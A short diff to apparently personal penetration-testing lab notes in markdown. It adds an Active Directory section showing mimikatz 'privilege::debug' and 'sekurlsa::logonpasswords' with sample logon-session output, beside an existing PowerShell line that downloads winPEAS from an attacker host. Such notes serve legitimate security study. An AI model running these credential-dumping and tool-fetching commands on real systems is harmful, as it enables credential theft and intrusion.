@@ -192,6 +192,22 @@ Install the latest PowerShell for new features and improvements! https://aka.ms/
 PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
 iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe
 ```
+### AD
+mimikatz
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+...
+Authentication Id : 0 ; 253683 (00000000:0003def3)
+Session           : Interactive from 1
+User Name         : beccy
+Domain            : BEYOND
+Logon Server      : DCSRV1
+Logon Time        : 3/8/2023 4:50:32 AM
+SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
+```
 
 ## Tips
 
